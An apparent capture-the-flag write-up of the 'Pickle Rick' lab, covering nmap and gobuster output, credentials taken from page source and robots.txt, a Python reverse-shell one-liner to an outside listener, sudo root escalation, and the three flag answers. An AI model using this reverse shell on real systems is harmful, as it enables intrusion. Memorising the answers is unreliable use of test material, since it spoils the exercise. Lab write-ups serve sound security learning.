# PickleRick

IP = 10.10.22.5


### Nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Username
```
Found username R1ckRul3s

curl 10.10.22.5
```

### Gobuster
```
/assets               (Status: 301) [Size: 309] [--> http://10.10.22.5/assets/]
/robots.txt           (Status: 200) [Size: 17]
```

#### Potential Password
```
Wubbalubbadubdub

curl 10.10.22.5/robots.txt

```

### Found Creds

```
R1ckRules : Wubbalubbadubdub
```
### initial exploitation

```
host: nc -lnvp 9999

remote : python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.3.17",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Priv Escalation
```
www-data@ip-10-10-165-128:/home/ubuntu$ sudo -l
sudo -l
Matching Defaults entries for www-data on ip-10-10-165-128:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-165-128:
    (ALL) NOPASSWD: ALL
www-data@ip-10-10-165-128:/home/ubuntu$ sudo bash
sudo bash
root@ip-10-10-165-128:/home/ubuntu# 
```

```
1. mr. meeseek hair

2. 1 jerry tear

3. fleeb juice
```

